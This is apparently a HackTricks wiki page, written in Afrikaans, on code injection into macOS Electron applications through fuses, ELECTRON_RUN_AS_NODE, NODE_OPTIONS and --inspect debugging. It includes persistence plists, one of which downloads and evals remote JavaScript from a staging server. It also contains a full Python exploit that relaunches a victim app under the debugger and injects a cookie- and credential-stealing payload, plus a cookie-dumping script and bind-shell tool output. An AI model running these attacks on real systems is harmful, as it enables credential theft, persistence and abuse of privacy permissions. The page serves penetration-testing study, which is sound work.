# macOS Electron Toepassings Inspuiting

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

As jy nie weet wat Electron is nie, kan jy [**baie inligting hier vind**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Maar vir nou moet jy net weet dat Electron **node** uitvoer.\
En node het 'n paar **parameters** en **omgewing veranderlikes** wat gebruik kan word om **ander kode uit te voer** behalwe die aangeduide lêer.

### Electron Fuse

Hierdie tegnieke sal volgende bespreek word, maar onlangs het Electron verskeie **veiligheidsvlaggies bygevoeg om dit te voorkom**. Dit is die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) en dit is diegene wat gebruik word om **te voorkom** dat Electron toepassings in macOS **arbitraire kode laai**:

- **`RunAsNode`**: As dit gedeaktiveer is, voorkom dit die gebruik van die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** om kode in te spuit.
- **`EnableNodeCliInspectArguments`**: As dit gedeaktiveer is, sal parameters soos `--inspect`, `--inspect-brk` nie gerespekteer word nie. Dit vermy hierdie manier om kode in te spuit.
- **`EnableEmbeddedAsarIntegrityValidation`**: As dit geaktiveer is, sal die gelaaide **`asar`** **lêer** deur macOS **gevalideer** word. **Dit voorkom** op hierdie manier **kode-inspuiting** deur die inhoud van hierdie lêer te wysig.
- **`OnlyLoadAppFromAsar`**: As dit geaktiveer is, sal dit slegs app.asar nagaan en gebruik, in plaas daarvan om in die volgende volgorde te soek: **`app.asar`**, **`app`** en uiteindelik **`default_app.asar`**. Dit verseker dat wanneer dit **gekombineer** word met die **`embeddedAsarIntegrityValidation`** fuse, dit **onmoontlik** is om **nie-gevalideerde kode** te **laai**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: As dit geaktiveer is, gebruik die blaaiersproses die lêer genaamd `browser_v8_context_snapshot.bin` vir sy V8-snapshot.

Nog 'n interessante fuse wat nie kode-inspuiting sal voorkom nie, is:

- **EnableCookieEncryption**: As dit geaktiveer is, word die koekie stoor op skyf geënkripteer met behulp van OS-vlak kriptografie sleutels.

### Kontroleer Electron Fuses

Jy kan **hierdie vlaggies nagaan** vanaf 'n toepassing met:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Soos die [**dokumentasie noem**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), is die konfigurasie van die **Electron Fuses** geconfigureer binne die **Electron binêre** wat êrens die string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** bevat.

In macOS toepassings is dit tipies in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
U kan hierdie lêer in [https://hexed.it/](https://hexed.it/) laai en soek na die vorige string. Na hierdie string kan u in ASCII 'n nommer "0" of "1" sien wat aandui of elke fuse gedeaktiveer of geaktiveer is. Pas eenvoudig die hex kode (`0x30` is `0` en `0x31` is `1`) aan om **die fuse waardes te wysig**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Let daarop dat as u probeer om die **`Electron Framework`** binêre binne 'n toepassing met hierdie bytes wat gewysig is, die app nie sal loop nie.

## RCE voeg kode by Electron Toepassings

Daar kan **eksterne JS/HTML lêers** wees wat 'n Electron App gebruik, so 'n aanvaller kan kode in hierdie lêers inspuit waarvan die handtekening nie nagegaan sal word nie en willekeurige kode in die konteks van die app uitvoer.

> [!CAUTION]
> egter, op die oomblik is daar 2 beperkings:
>
> - Die **`kTCCServiceSystemPolicyAppBundles`** toestemming is **nodig** om 'n App te wysig, so standaard is dit nie meer moontlik nie.
> - Die gecompileerde **`asap`** lêer het gewoonlik die fuses **`embeddedAsarIntegrityValidation`** `en` **`onlyLoadAppFromAsar`** `geaktiveer`
>
> Dit maak hierdie aanvalspad meer ingewikkeld (of onmoontlik).

Let daarop dat dit moontlik is om die vereiste van **`kTCCServiceSystemPolicyAppBundles`** te omseil deur die toepassing na 'n ander gids te kopieer (soos **`/tmp`**), die vouer **`app.app/Contents`** te hernoem na **`app.app/NotCon`**, **die** **asar** lêer met u **kwaadwillige** kode te **wysig**, dit weer terug te hernoem na **`app.app/Contents`** en dit uit te voer.

U kan die kode uit die asar lêer onpak met:
```bash
npx asar extract app.asar app-decomp
```
En pak dit weer in nadat dit met die volgende gewysig is:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE met ELECTRON_RUN_AS_NODE

Volgens [**die dokumentasie**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), as hierdie omgewing veranderlike gestel is, sal dit die proses as 'n normale Node.js-proses begin.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> As die fuse **`RunAsNode`** gedeaktiveer is, sal die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** geïgnoreer word, en dit sal nie werk nie.

### Inspuiting vanaf die App Plist

Soos [**hier voorgestel**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kan jy hierdie omgewing veranderlike in 'n plist misbruik om volharding te handhaaf:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE met `NODE_OPTIONS`

Jy kan die payload in 'n ander lêer stoor en dit uitvoer:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> As die fuse **`EnableNodeOptionsEnvironmentVariable`** is **deaktiveer**, sal die app die env var **NODE_OPTIONS** **ignore** wanneer dit gelaai word, tensy die env variabele **`ELECTRON_RUN_AS_NODE`** gestel is, wat ook **geignore** sal word as die fuse **`RunAsNode`** deaktiveer is.
>
> As jy nie **`ELECTRON_RUN_AS_NODE`** stel nie, sal jy die **fout** vind: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Inspuiting vanaf die App Plist

Jy kan hierdie env variabele in 'n plist misbruik om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE met inspeksie

Volgens [**hierdie**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) kan jy 'n Electron-toepassing uitvoer met vlae soos **`--inspect`**, **`--inspect-brk`** en **`--remote-debugging-port`**, 'n **debug-poort sal oop wees** sodat jy daaraan kan koppel (byvoorbeeld vanaf Chrome in `chrome://inspect`) en jy sal in staat wees om **kode daarop in te spuit** of selfs nuwe prosesse te begin.\
Byvoorbeeld:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**hierdie blogpos**](https://hackerone.com/reports/1274695), word hierdie debugging misbruik om 'n headless chrome **arbitraire lêers in arbitraire plekke af te laai**.

> [!TIP]
> As 'n app sy eie manier het om te kontroleer of omgewing veranderlikes of parameters soos `--inspect` gestel is, kan jy probeer om dit in runtime te **omseil** met die arg `--inspect-brk` wat die **uitvoering stop** aan die begin van die app en 'n omseiling uitvoer (deur die args of die omgewing veranderlikes van die huidige proses te oorskryf byvoorbeeld).

Die volgende was 'n exploit wat monitering en die uitvoering van die app met die parameter `--inspect-brk` moontlik gemaak het om die persoonlike beskerming wat dit gehad het te omseil (deur die parameters van die proses te oorskryf om `--inspect-brk` te verwyder) en dan 'n JS payload in te spuit om koekies en geloofsbriewe van die app te dump.
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> As die fuse **`EnableNodeCliInspectArguments`** gedeaktiveer is, sal die app **node parameters** (soos `--inspect`) ignoreer wanneer dit gelaai word, tensy die omgewing veranderlike **`ELECTRON_RUN_AS_NODE`** gestel is, wat ook **geignoreer** sal word as die fuse **`RunAsNode`** gedeaktiveer is.
>
> U kan egter steeds die **electron param `--remote-debugging-port=9229`** gebruik, maar die vorige payload sal nie werk om ander prosesse uit te voer nie.

Deur die param **`--remote-debugging-port=9222`** te gebruik, is dit moontlik om sekere inligting van die Electron App te steel, soos die **geskiedenis** (met GET-opdragte) of die **cookies** van die blaaier (aangesien dit **ontsleuteld** binne die blaaiers is en daar 'n **json endpoint** is wat hulle sal gee).

U kan leer hoe om dit te doen in [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) en [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) en die outomatiese hulpmiddel [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) of 'n eenvoudige skrip soos:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Jy kan hierdie omgewing veranderlike in 'n plist misbruik om volharding te handhaaf deur hierdie sleutels by te voeg:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass wat ouer weergawes misbruik

> [!TIP]
> Die TCC daemon van macOS kontroleer nie die uitgevoerde weergawe van die toepassing nie. So as jy **nie kode in 'n Electron-toepassing kan inspuit nie** met enige van die vorige tegnieke, kan jy 'n vorige weergawe van die APP aflaai en kode daarop inspuit, aangesien dit steeds die TCC voorregte sal ontvang (tenzij Trust Cache dit voorkom).

## Voer nie-JS kode uit

Die vorige tegnieke sal jou toelaat om **JS kode binne die proses van die electron-toepassing** uit te voer. Onthou egter dat die **kind prosesse onder dieselfde sandbox profiel** as die ouer toepassing loop en **hul TCC toestemmings erf**.\
Daarom, as jy voorregte wil misbruik om toegang tot die kamera of mikrofoon te verkry, kan jy eenvoudig **'n ander binêre vanaf die proses uitvoer**.

## Opmerklike Electron macOS Kw vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integriteit omseiling

Electron ≤22.3.23 en verskeie 23-27 voorafweergawes het 'n aanvaller met skrywe toegang tot die `.app/Contents/Resources` gids toegelaat om die `embeddedAsarIntegrityValidation` **en** `onlyLoadAppFromAsar` fuses te omseil. Die fout was 'n *lêer-tipe verwarring* in die integriteitskontroleerder wat 'n vervaardigde **gids genaamd `app.asar`** toegelaat het om gelaai te word in plaas van die gevalideerde argief, sodat enige JavaScript wat binne daardie gids geplaas is, uitgevoer is wanneer die app begin het. Selfs verskaffers wat die hardening riglyne gevolg het en beide fuses geaktiveer het, was dus steeds kwesbaar op macOS.

Gepatchte Electron weergawes: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** en **27.0.0-alpha.7**. Aanvallers wat 'n toepassing vind wat 'n ouer weergawe uitvoer, kan `Contents/Resources/app.asar` met hul eie gids oorskryf om kode met die toepassing se TCC voorregte uit te voer.

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE-kluster

In Januarie 2024 het 'n reeks CVEs (CVE-2024-23738 tot CVE-2024-23743) beklemtoon dat baie Electron-apps met die fuses **RunAsNode** en **EnableNodeCliInspectArguments** steeds geaktiveer is. 'n Plaaslike aanvaller kan dus die program herlaai met die omgewing veranderlike `ELECTRON_RUN_AS_NODE=1` of vlae soos `--inspect-brk` om dit in 'n *generiese* Node.js proses te verander en al die toepassing se sandbox en TCC voorregte te erf.

Alhoewel die Electron-span die “kritieke” gradering betwis het en opgemerk het dat 'n aanvaller reeds plaaslike kode-uitvoering benodig, is die probleem steeds waardevol tydens post-exploitatie omdat dit enige kwesbare Electron bundel in 'n *living-off-the-land* binêre kan verander wat byvoorbeeld Kontakte, Foto's of ander sensitiewe hulpbronne wat voorheen aan die desktop-app toegestaan is, kan lees.

Defensiewe riglyne van die Electron onderhouders:

* Deaktiveer die `RunAsNode` en `EnableNodeCliInspectArguments` fuses in produksie boue.
* Gebruik die nuwer **UtilityProcess** API as jou toepassing wettiglik 'n helper Node.js proses benodig in plaas van om daardie fuses weer te aktiveer.

## Outomatiese Inspuiting

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Die hulpmiddel [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kan maklik gebruik word om **kwesbare electron-toepassings** wat geïnstalleer is te vind en kode daarop in te spuit. Hierdie hulpmiddel sal probeer om die **`--inspect`** tegniek te gebruik:

Jy moet dit self saamstel en kan dit soos volg gebruik:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki is ontwerp om Electron-toepassings te backdoor deur die toepassings se JavaScript-lêers te vervang met die Loki Command & Control JavaScript-lêers.


## References

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [https://www.electronjs.org/blog/statement-run-as-node-cves](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
